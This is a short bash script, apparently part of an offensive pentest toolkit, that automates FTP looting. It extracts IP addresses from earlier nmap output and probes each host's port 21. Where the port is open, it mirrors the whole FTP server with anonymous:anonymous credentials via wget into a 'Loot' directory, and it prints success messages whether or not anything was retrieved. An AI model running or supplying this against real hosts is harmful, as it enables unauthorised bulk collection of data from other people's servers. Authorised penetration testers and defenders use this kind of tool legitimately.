#!/bin/bash

source staticValues.env

# ==== FTP ENUMERATION ======================================

#
cat ./Output/grep*.txt | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" >> ScannedHosts.txt

#
touch TargetHosts.txt
if [ -s ScannedHosts.txt ]; then
    # The file is not-empty.
    while read Host;
    do
        #
        if ! cat TargetHosts.txt | grep -q $Host;
        then
            echo $Host >> TargetHosts.txt
        fi
    done < ScannedHosts.txt
else
    # The file is empty.
    echo -e "${YELLOW}[FTP]${WHITE} Nmap scanned 0 targets." && echo ""
fi

# Check if anonymous login is allowed on FTP
while read Host;
do
    # Check FTP is reachable on target machine
    if nmap -p 21 $Host | grep -q "open";
    then
        #
        wget -m --no-passive ftp://anonymous:anonymous@$Host &> /dev/null
        echo -e "${GREEN}[SUCCESS]${WHITE} Some files were extracted from $Host."
        
        #
        mv $Host Loot/
    else
        echo -e "${RED}[ERROR]${WHITE} FTP wasn't detected on $Host." 
    fi
done < TargetHosts.txt

# Cleanup
rm ScannedHosts.txt
rm TargetHosts.txt

echo "" && echo -e "${GREEN}[SUCCESS]${WHITE} Files were successfully extracted from the target FTP server." && echo ""